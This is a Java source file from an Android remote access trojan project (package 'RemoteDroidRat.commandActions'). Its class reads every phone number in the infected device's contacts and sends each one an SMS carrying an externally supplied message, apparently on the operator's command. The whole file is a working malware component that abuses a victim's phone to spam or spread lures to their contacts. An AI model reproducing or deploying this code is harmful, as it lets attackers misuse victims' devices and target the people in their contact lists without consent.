package com.KaranKumar.RemoteDroidRat.commandActions;
import android.content.Context;
import java.util.List;
import android.telephony.SmsManager;
import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.ContactsContract;
import java.util.ArrayList;

public class sendMassageToAll {
    
    

		

		public void sendSmsToAllContacts(String message, Context context) {
			List<String> contacts = getContacts(context);

			for (String contact : contacts) {
				sendSms(contact, message);
			}
		}

		private void sendSms(String phoneNumber, String message) {
			try {
				SmsManager smsManager = SmsManager.getDefault();
				smsManager.sendTextMessage(phoneNumber, null, message, null, null);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

		private List<String> getContacts(Context context) {
			List<String> contacts = new ArrayList<>();
			ContentResolver contentResolver = context.getContentResolver();

			Cursor cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                null,
                null,
                null
			);

			if (cursor != null && cursor.moveToFirst()) {
				do {
					String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
					contacts.add(phoneNumber);
				} while (cursor.moveToNext());

				cursor.close();
			}

			return contacts;
		}
	}
